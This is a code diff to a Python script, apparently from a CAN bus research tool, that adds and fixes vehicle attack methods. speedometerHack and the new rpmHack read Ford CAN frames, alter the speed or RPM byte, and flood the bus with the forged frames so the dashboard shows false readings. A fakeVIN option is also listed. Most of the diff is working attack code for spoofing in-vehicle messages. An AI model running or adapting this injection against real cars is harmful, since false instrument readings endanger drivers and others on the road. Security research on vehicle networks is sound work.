@@ -280,37 +280,74 @@ class FordExperiments(experiments):
             # catch a packet and check its db4 value
             while (packet == None):
                 packet=self.client.rxpacket();
-                
-            print "DB4 = %d" %packet[9]
-            mph = 1.617*packet[9] - 63.5
-            print "Current MPH = 1.617(%d)-63.5 = %d" %(packet[9], mph)
+            
+            print self.client.packet2str(packet)
+
+            print "DB4 = %02d " %ord(packet[9])
+            mph = 1.617*ord(packet[9]) - 63.5
+            print "Current MPH = 1.617(%d)-63.5 = %d" %(ord(packet[9]), mph)
                 
             # calculate our new mph and db4 value
             mph = mph + inputs[0];
-            packet[9] = ( mph + 63.5 ) / 1.617
+            newSpeed = ( mph + 63.5 ) / 1.617
+            print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)
+
+                
+            newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
+                           0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
+                           # lower nibble is DLC                   
+                           ord(packet[5]),ord(packet[6]),ord(packet[7]),ord(packet[8]),int(newSpeed),ord(packet[10]),ord(packet[11]),ord(packet[12])]
 
             # load new packet into TXB0 and check time
-            self.multiPacketSpit(packet0=packet, packet0rts=True)
+            self.multiPacketSpit(packet0=newPacket, packet0rts=True)
             starttime = time.time()
             
             # spit new value for 1 second
             while (time.time()-starttime < 1):
                 self.multiPacketSpit(packet0rts=True)
+
+    def rpmHack(self, inputs):
+    
+        self.client.serInit()
+        self.spitSetup(500)
+    
+        self.addFilter([513, 513, 513])
+    
+        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
+        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
+    
+        while(1):
+        
+            packet = None;
+        
+            # catch a packet and check its db4 value
+            while (packet == None):
+                packet=self.client.rxpacket();
+        
+            print self.client.packet2str(packet)
+        
+            print "DB4 = %02d " %ord(packet[5])
+            rpm = 64.5*ord(packet[5]) - 61.88
+            print "Current RPM = 64.5(%d)-61.88 = %d" %(ord(packet[5]), rpm)
+        
+            # calculate our new mph and db4 value
+            rpm = rpm + inputs[0];
+            newRPM = ( rpm + 61.88 ) / 64.5
+            print "Fake RPM = 64.5(%d)-61.88 = %d" %(newRPM, rpm)
             
-
-
-            [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
-                      0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
-                      # lower nibble is DLC                   
-                      packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
-    
-    
-#        while((time.time()-starttime < duration)):
-#                    
-#                    if(faster):
-#                        packet=self.client.fastrxpacket();
-#                    else:
-
+        
+            newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
+                     0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
+                     # lower nibble is DLC                   
+                     int(newRPM),ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]
+        
+            # load new packet into TXB0 and check time
+            self.multiPacketSpit(packet0=newPacket, packet0rts=True)
+            starttime = time.time()
+        
+            # spit new value for 1 second
+            while (time.time()-starttime < 1):
+                self.multiPacketSpit(packet0rts=True)
 
        
         
@@ -323,7 +360,7 @@ if __name__ == "__main__":
             speedometerHack
             fakeVIN
         ''')
-    parser.add_argument('verb', choices=['speedometerHack']);
+    parser.add_argument('verb', choices=['speedometerHack', 'rpmHack']);
     parser.add_argument('-v', '--variable', type=int, action='append', help='Input values to the method of choice', default=None);
 
 
@@ -333,6 +370,8 @@ if __name__ == "__main__":
     
     if( args.verb == 'speedometerHack'):
         fe.speedometerHack(inputs=inputs)
+    if( args.verb == 'rpmHack'):
+        fe.rpmHack(inputs=inputs)
     elif( args.verb == 'fakeVIN'):
         fe.fakeVIN()
         
